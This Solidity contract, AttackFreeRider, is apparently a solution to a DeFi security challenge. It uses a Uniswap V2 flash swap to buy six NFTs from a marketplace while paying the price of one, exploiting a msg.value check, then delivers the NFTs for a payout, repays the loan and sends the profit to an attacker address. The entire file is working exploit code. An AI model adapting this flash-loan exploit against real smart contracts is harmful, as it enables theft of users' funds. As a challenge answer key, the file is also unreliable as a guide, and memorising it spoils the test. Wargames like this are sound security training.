// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "hardhat/console.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IWETH {
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

/**
 * @title Attack FreeRiderNFTMarketplace
 */
contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair pair;
    IWETH weth;
    FreeRiderNFTMarketplace marketplace;
    IERC721 nft;
    address buyer;
    address attacker;

    uint256 constant NFT_COST = 15 ether;

    constructor(
        IUniswapV2Pair _pair,
        IWETH _weth,
        FreeRiderNFTMarketplace _marketplace,
        IERC721 _nft,
        address _buyer,
        address _attacker
    ) {
        pair = _pair;
        weth = _weth;
        marketplace = _marketplace;
        nft = _nft;
        buyer = _buyer;
        attacker = _attacker;
    }

    function flashLoan() external {
        pair.swap(NFT_COST, 0, address(this), "hi");
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        weth.withdraw(NFT_COST); // convert weth to ether

        uint256[] memory tokenIds = new uint256[](6);
        for (uint8 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: NFT_COST}(tokenIds);

        // Send NFT's to buyer to get 45 ETH payout
        for (uint8 tokenId = 0; tokenId < 6; tokenId++) {
            nft.safeTransferFrom(address(this), buyer, tokenId);
        }

        // Pay back loan
        uint256 fee = ((NFT_COST * 3) / uint256(997)) + 1;
        weth.deposit{value: NFT_COST + fee}();
        weth.transfer(address(pair), NFT_COST + fee);

        // Send ETH to attacker
        payable(attacker).transfer(address(this).balance);
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
